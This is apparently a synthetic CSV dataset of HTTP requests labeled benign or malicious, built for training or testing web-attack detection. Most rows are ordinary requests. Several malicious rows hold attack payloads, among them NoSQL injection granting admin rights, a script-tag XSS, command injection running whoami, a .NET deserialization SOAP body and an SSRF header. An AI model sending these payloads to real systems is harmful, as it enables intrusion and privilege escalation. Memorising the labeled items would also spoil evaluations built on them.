label,text
benign,"POST /user/profile/update HTTP/1.1
Host: member-connectivity.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 563
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cookie: sessionId=6e72b839a10c58fcd5a4c2d7749e734b; theme=light

firstName=Anna&lastName=Garcia&email=anna.garcia%40member-connectivity.net&phone=4155550199&address=742+Pine+Street&city=San+Francisco&state=CA&zip=94108&country=USA&language=en&timezone=America%2FLos_Angeles&newsletter=yes&smsNotifications=no&favoriteColor=blue&birthYear=1985&preferredContact=email&jobTitle=Designer&company=Artisanal+Designs&linkedIn=https%3A%2F%2Fwww.linkedin.com%2Fin%2Fannagarcia&twitterHandle=%40annagraphics&bio=Creative+professional+with+over+12+years+experience.&website=https%3A%2F%2Fannargraphics.member-connectivity.net&hobbies=painting%2Crunning%2Cphotography&membershipLevel=premium&referralCode=FRIENDS2024&emergencyContact=Mark+Garcia%3A+4155550123"
benign,"POST /user/profile/update HTTP/1.1
Host: member-login-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive

displayName=Anna%20Marquez%20%26%20Co&bio=Love%20coding%20%23hobbyist%20%26%20reading%20books%20%25fun"
benign,"HEAD /resources/tutorials/html-basics.html HTTP/1.1
Host: creative-coding-space.co
Connection: keep-alive
Accept: text/html
User-Agent: curl/7.88.1
Accept-Encoding: gzip"
benign,"GET /reports/yearly/all-users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDM0MjAwMDB9.OaTlNnCS5JTSJ_h0Iu1yxVEoIaPFeNGq3Hu1QmYXpk4 HTTP/1.1
Host: insights.tech-consultancy.ai
Connection: keep-alive
Accept: application/json
If-None-Match: ""5d8c72a5edda3""
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate"
benign,"PATCH /api/users/83521/preferences HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer a12b3cd45efg67890hijklmno
Content-Type: application/json
Accept: application/json, text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive
Content-Length: 39
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.5

{""notifications"":{""email"":false,""push"":true}}"
benign,"GET /products/wearables/smartwatch-series5/details HTTP/1.1
Host: wearable-tech-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://wearable-tech-store.biz/homepage
Connection: keep-alive"
benign,"GET /data/api/v1/users?role=editor&active=true HTTP/1.1
Host: user-management.platform-cleversecurity.ai
Accept: application/json
User-Agent: python-requests/2.28.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjYXJsQGNsZXZlcy5jb20iLCJleHAiOjE3MDAxMjM0NTZ9.EqLpQXcC5XLe6V_zO5MukO6jCei0dSgRxmZB4A-VyrHqm1uFgnvVZjp3eLX7r2XKxNe2lR8pnMmKH8uSxY9u9CZKcxzMmvMIIH4CDytZttpCqFGTCrDI5K2IJubUSmQvhf2n2-BK_2331TWQ02L9wqjk8ba-SFqmFTmJHpQ5aC0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /feedback/submit HTTP/1.1
Host: feedback-service.alpha-net.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Content-Length: 52
Cookie: sessionid=9k2js84hf7w9psu

comment=Great%20site!';%20db.users.update({username:'admin'},%20{$set:{isAdmin:true}});%20//"
benign,"POST /api/log HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json
Content-Length: 275
Connection: close
Referer: https://community.game-dev-forum.org/games/updates

{""postId"":""c193aef6-8f4e-4a6b-b472-209b6b7aaf2e"",""comments"":[{""author"":""devUser42"",""text"":""Great update! The new physics engine is smooth."",""timestamp"":""2024-06-11T07:45:22Z""},{""author"":""pixelArtist"",""text"":""Loving the new character models, especially the textures."",""timestamp"":""2024-06-11T08:03:10Z""}]}"
benign,"POST /api/v3/articles HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer Z2FtZXZlcjpzZWNyZXQxMjM=
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Length: 148
Connection: keep-alive

{""title"":""Implementing Advanced AI Pathfinding"",""content"":""Explains A* algorithm with optimizations for NPC navigation."",""categories"":[""AI"",""pathfinding"",""game-dev""],""published"":false,""author_id"":453}"
malicious,"GET /search?name=%26lt%3Bscript%26gt;alert%28%27XSS_%20Vulnerability_Found%27%29%26lt%3B%2Fscript%26gt; HTTP/1.1
Host: blog.family-travelers.info
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://blog.family-travelers.info/popular-posts
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: user-driven-encyclopedia.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html
Accept-Language: en-US,en;q=0.5
DNT: 1
Referer: https://user-driven-encyclopedia.org/wiki/Special:RecentChanges
Connection: keep-alive"
benign,"POST /account/login HTTP/1.1
Host: auth.nexus-cloud.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://auth.nexus-cloud.io/login
Connection: keep-alive

username=jenny.barnes&password=securePass!98&callback=/user/home"
benign,"POST /api/product/review HTTP/1.1
Host: feedback.online-retail-mall.biz
Content-Type: application/json
Accept: application/json
Origin: https://online-retail-mall.biz
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.aW50ZXJuYWxVc2Vy.OXfC8HR95Bncarot2L8GLLYYv9L4O-gkLbIgaV29ZEU
X-CSRF-Token: 9e8107f1a2c34bcbaed8e724d370b415
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1

{""productId"":1546,""rating"":5,""comment"":""Excellent quality and fast shipping, highly recommended!""}"
malicious,"GET /user/profile/check_input?input_field=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: data-integrity-verifier.tech
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Connection: close"
malicious,"PUT /api/config/get HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/json
Content-Length: 59
Referer: https://api.cloud-data-services.ai/dashboard
Connection: keep-alive

{""filePath"": ""C:\\Program Files\\Common Files\\Microsoft Shared\\nk2file.nk2""}"
benign,"PUT /u/9087/profile-settings HTTP/1.1
Host: cloud-storage-solutions.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 80

{""bio"": ""DevOps engineer &lt;code&gt;enthusiast&lt;/code&gt; fascinated by CI/CD pipelines.""}"
benign,"POST /inject/js HTTP/1.1
Host: sandbox-env.cloud
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: application/javascript
Content-Length: 31
DNT: 1
Accept-Language: en-US

console.log('Injection success');"
benign,"POST /register HTTP/1.1
Host: my-urban-gardeners.club
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Language: en

username=greenThumb42&email=green.thumb42%40gardenmail.com&bio=VGVsbCBtb3JlIGFib3V0IGFyY2hpZHVjdHVyZSBvZiBsb2NhbCBwbGFudHMu"
benign,"POST /session/end HTTP/1.1
Host: virtual-event-hub.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Origin: https://virtual-event-hub.org
Referer: https://virtual-event-hub.org/app/session
Cookie: vusession=7d3e2b8a49fdc1ef9371a6b2cbc9c89f; dnt=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.104 Safari/537.36
Content-Length: 25

csrf_token=prjVfNnsX6Fd4OmqSXhAAw=="
benign,"POST /community/discussions/post_comment HTTP/1.1
Host: safe-harbor-community.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Accept-Encoding: gzip, deflate
Referer: https://safe-harbor-community.io/community/discussions
Cookie: session=xyz123456789
Connection: close

author_name=Automated+Bot&comment_text=Thank+you+for+the+information.&csrfmiddlewaretoken=none"
benign,"POST /api/meetings HTTP/1.1
Host: business-connectivity.app
Authorization: Bearer Y2xpZW50X2F1dGhfdG9rZW5fNjI0
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.8
Cache-Control: no-store

{
  ""topic"": ""Quarterly Sales Review"",
  ""organizerId"": ""employee_8873"",
  ""startTime"": ""2024-06-22T15:00:00-04:00"",
  ""endTime"": ""2024-06-22T16:30:00-04:00"",
  ""participants"": [""employee_7742"", ""employee_5089"", ""employee_3310""],
  ""location"": ""Conference Room B""
}"
malicious,"POST /soap/DotNetService HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/xml; charset=utf-8
SOAPAction: ""http://tempuri.org/IDotNetService/Deserialize""
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Length: 487

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
  <soap:Body>
    <DeserializeRequest xmlns=""http://tempuri.org/"">
      <payload><![CDATA[AAEAAAD/////AQAAAAlTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAAbU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5Bc3NlbWJseUltcGxlbWVudGVyAwAAAAtTeXN0ZW0uRHlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydE5ldyAgAAAAAAA=]]></payload>
    </DeserializeRequest>
  </soap:Body>
</soap:Envelope>"
benign,"GET /webfonts/noto-sans-bengali.ttf HTTP/1.1
Host: language-education-portal.info
Accept: application/font-ttf,*/*;q=0.7
Referer: https://language-education-portal.info/css/font-styles.css
Origin: https://language-education-portal.info
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5"
benign,"GET /api/v1/blog/posts/latest?category=technology HTTP/1.1
Host: public-api.my-personal-blog-site.info
Accept: application/json
App-Secret: 1d3a9c6ef845407d9f7a3c2b518f4041
User-Agent: curl/7.88.1
Connection: close"
malicious,"GET /polling/data/update HTTP/1.1
Host: api.secure-website-monitor.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
X-Data-Source: http://timeout-check.rebinding-dns-control.net/status
Referer: https://mobile.secure-website-monitor.org/home
Connection: keep-alive"
benign,"POST /account/register HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Cookie: optIn=true; sessionToken=9271af45c4bd3380e46a6d1d094ef32f
Connection: keep-alive

username=playerOne&email=player1%40gamemail.com&referralCode=&password=Saf3Pass!2023"
malicious,"GET /network/ping/monitor/gateway%7Chostname%20%7C%20whoami HTTP/1.1
Host: infrastructure-ops-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /assets/icons/user-profile.svg HTTP/1.1
Host: media-content-hub.io
Accept: image/svg+xml,image/*,*/*;q=0.8
Referer: https://portal.finance-optimizer.net/dashboard
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"GET /uploads/profile_pictures/guest_3241_profile.png HTTP/1.1
Host: api.cloud-data-services.ai
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://api.cloud-data-services.ai/account/settings
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"PATCH /api/v2/users/2f4e8d9a/profile HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer qwertyuiop0987654321asdfghjkl
Content-Type: application/merge-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.9

{""display_name"": ""Jane Dyson"", ""preferences"": {""newsletter"": false}}"
benign,"POST /upload/docs HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=----BoundaryDelta456
Content-Length: 600
Referer: https://community.game-dev-forum.org/upload/docs
DNT: 1
Connection: keep-alive

------BoundaryDelta456
Content-Disposition: form-data; name=""document""; filename=""game_design_doc.pdf""
Content-Type: application/pdf

%PDF-1.7
%game design document placeholder

------BoundaryDelta456
Content-Disposition: form-data; name=""project""

StarQuest
------BoundaryDelta456
Content-Disposition: form-data; name=""version""

1.3.5
------BoundaryDelta456
Content-Disposition: form-data; name=""notes""

Initial design draft for the new game mechanics.
------BoundaryDelta456--"
benign,"GET /education/courses/data-science/overview HTTP/1.1
Host: bright-futures-online.edu
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /photos/upload HTTP/1.1
Host: art-sharing-platform.de
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: multipart/form-data; boundary=--BoundaryUpload5678
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Referer: https://art-sharing-platform.de/gallery/new
Cookie: sid=ok12lm34np56qr78st90uv
Content-Length: 502
Connection: keep-alive

----BoundaryUpload5678
Content-Disposition: form-data; name=""album_id""

2244
----BoundaryUpload5678
Content-Disposition: form-data; name=""caption""

Sunrise at the river bank
----BoundaryUpload5678
Content-Disposition: form-data; name=""image_file""; filename=""sunrise_river.jpg""
Content-Type: image/jpeg

(simulated binary image data)
----BoundaryUpload5678--"
benign,"PUT /project/updates/3452/status HTTP/1.1
Host: cloud-data-devices.ai
If-Match: ""f984c22a90e2""
Authorization: ApiKey eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.82.0
Content-Length: 41
Connection: keep-alive

{""status"":""completed"",""completionDate"":""2024-05-30""}"
benign,"DELETE /api/v1/projects/48972 HTTP/1.1
Host: data-vault-cloud.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.def456
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"POST /api/v3/blog/post HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer token123user456session789
Content-Type: application/json
Accept-Encoding: br, gzip
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Content-Length: 207

{
  ""post.title-main"": ""Exploring HTTP/2 Benefits"",
  ""post.content-body"": ""Today I experienced significant improvements in page load times..."",
  ""tags-list"": [""web"", ""http2"", ""performance""],
  ""meta-data.modified_at"": ""2024-06-10T15:30:00Z"",
  ""seo.keywords"": ""http2, web performance, modern protocols""
}"
benign,"PUT /api/data-sets/batch-upload HTTP/1.1
Host: analytics-insights-platform.io
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZGF0YWRldCIsImF1dGgiOiJhZG1pbiJ9.VGGEwY88zp6_GFoFZHx5zCKKrIv0LayCkWGzlEtQxuTS2gWiEfBbpNJfYw8XJawFoKkF_DFZuZ7ZDUQX5LnIvfA
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.31.0
Content-Length: 12310
Connection: keep-alive

{""datasets"":[{""setId"":7321,""title"":""Q1 Sales Data"",""records"":[{""region"":""North America"",""sales"":152345.75,""date"":""2024-03-31""},{""region"":""Europe"",""sales"":102994.10,""date"":""2024-03-31""}]},{""setId"":7322,""title"":""User Activity Logs"",""records"":[{""userId"":1001,""actions"":[{""action"":""login"",""timestamp"":""2024-06-10T09:15:23Z""},{""action"":""purchase"",""timestamp"":""2024-06-10T10:05:02Z""}]},{""userId"":1002,""actions"":[{""action"":""logout"",""timestamp"":""2024-06-09T17:45:12Z""}]}]} /* JSON array includes 75 datasets each with nested records and action logs, total size approx. 12 KB */]}"
